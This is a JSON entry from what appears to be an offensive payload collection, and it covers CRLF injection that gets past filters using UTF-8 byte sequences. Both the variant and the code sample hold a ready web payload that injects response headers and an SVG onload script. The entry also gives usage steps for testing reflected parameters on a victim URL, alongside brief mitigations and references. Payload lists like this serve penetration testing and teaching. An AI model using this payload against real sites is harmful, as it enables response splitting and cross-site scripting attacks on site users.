{"id": "payload_000011", "important": {"title": "CRLF Injection - Filter Bypass (UTF-8 trick) & Labs/Tools", "category": "Injection", "sub_category": "CRLF Filter Bypass", "tags": ["crlf", "utf8", "filter-bypass", "labs", "tools"], "targets": {"os": ["Any"], "system": ["Browser", "Web App", "Proxy"]}, "risk": "high"}, "variants": [{"match": {"os": ["Any"], "system": ["Browser"]}, "payload": {"explanation": "Use UTF-8 characters whose bytes contain 0x0A/0x0D to bypass naive filters (Firefox behavior example).", "code": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert(document.domain()%E5%98%BE", "run_context": "browser (Firefox normalization) or Burp; observe whether bytes normalize to CR/LF", "placeholders": {"TARGET_PARAM": "vulnerable_param"}, "notes": "Browser-specific; test in affected browsers and with proxies to see end-to-end behavior."}}], "usage": {"steps": ["Try UTF-8 payloads in reflected parameters that are filtered for literal %0D/%0A.", "Test in multiple browsers (Firefox, Chrome) and through proxies to determine where normalization happens.", "Combine UTF-8 trick with response-splitting payloads to attempt header/body injection."], "tools": ["Burp Suite", "Browser (Firefox/Chrome)"], "required_params": {"target_url": {"required": true, "example": "https://victim.example.com/?q=<payload>"}}, "code_samples": [{"title": "UTF-8 Filter Bypass Example", "description": "UTF-8 string that may result in CR/LF after normalization.", "code": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert(document.domain()%E5%98%BE", "placeholders": {"TARGET_PARAM": "vulnerable_param"}, "run_context": "browser (Firefox)"}], "mitigations": ["Normalize and validate encoding before any header usage.", "Reject non-ASCII control-like UTF-8 sequences in header-related parameters.", "Implement server-side canonicalization and strict input validation."], "references": ["PortSwigger - CORS/CRLF labs", "CRLF Injection - CWE-93 - OWASP"]}, "system": {"version": "2.0.0", "source": "PayloadsAllTheThings"}}
